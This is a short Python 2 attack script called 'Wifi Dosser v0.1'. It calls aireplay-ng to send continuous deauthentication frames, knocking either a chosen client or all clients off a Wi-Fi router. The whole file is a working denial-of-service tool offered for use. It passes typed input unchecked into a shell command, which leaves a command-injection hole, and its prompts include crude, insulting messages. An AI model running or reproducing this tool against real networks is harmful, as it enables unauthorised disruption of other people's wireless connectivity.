import time
import subprocess
from datetime import datetime

#start program
class DeauthenticationAttack:
	def __init__(self, option, mac_address, kick_client, kick_all, iface, router_bssid_one, router_bssid_two, iface_one, iface_two):
		self.option = option
		self.mac_address
		self.kick_client = kick_client
		self.kick_all = kick_all
		self.iface = iface
		self.router_bssid_one = router_bssid_one
		self.router_bssid_two = router_bssid_two
		self.iface_one = iface_one
		self.iface_two = iface_two

	@classmethod
	def kick_client_from_router(cls):
		cls.router_bssid_one = raw_input('[+] Enter BSSID of router: ')
		print('[+] Router MAC address set to: {}'.format(cls.router_bssid_one))
		time.sleep(2)
		cls.kick_client = raw_input('[+] Enter client MAC address to kick: ')
		print('[+] Client MAC address set to: {}'.format(cls.kick_client))
		cls.iface_one = raw_input('[+] Enter interface')
		print('[+] Interface set to: {}'.format(cls.iface_one))
		launch_attack = raw_input('[+] Attack ready to launch! Launch attack(y/n): ')
		if(launch_attack == 'y') or (launch_attack == 'yes'):
			print('[+] Shits about to get realz...')
			time.sleep(3)
			launch_dos_attack = 'aireplay-ng -0 0 -a {} -c {} {}'.format(cls.router_bssid_one, cls.kick_client,
															cls.iface_one)
			subprocess.call(launch_dos_attack, shell=True)
		elif(launch_attack == 'n') or (launch_attack == 'no'):
			print('[+] Ahh what a waste of time you sissy ass bitch! Bye...dont come back \#LuLz')
			time.sleep(3)
			exit()
	@classmethod
	def kick_all_from_router(cls):
		cls.router_bssid_two = raw_input('[+] Enter BSSID of router: ')
		cls.iface_two = raw_input('[+] Enter interface to use: ')
		print('[+] Interface set to: {}'.format(cls.iface_two))
		launch_the_attack = raw_input('[+] Attack ready to launch! Launch attack(y/n): ')
		if(launch_the_attack == 'y') or (launch_the_attack == 'yes'):
			print('[+] Shits about to get realz...')
			time.sleep(3)
			launch_da_dos_attack = 'aireplay-ng -0 0 -a {} {}'.format(cls.router_bssid_two, cls.iface_two)
			subprocess.call(launch_da_dos_attack, shell=True)

	@classmethod
	def get_option(cls):
		print(""" 
		Wifi Dosser v0.1
		---------------------------
		1.) Kick a client
		2.) Kick all from router
		""")
		cls.option = raw_input('[+] Select an option from above: ')
		if(cls.option == str(1)):
			print('[+] Option set to: 1')
			time.sleep(2)
			DeauthenticationAttack.kick_client_from_router()
		elif(cls.option == str(2)):
			print('[+] Option set to: 2')
			time.sleep(2)
			DeauthenticationAttack.kick_all_from_router()



DeauthenticationAttack.get_option()











#end program
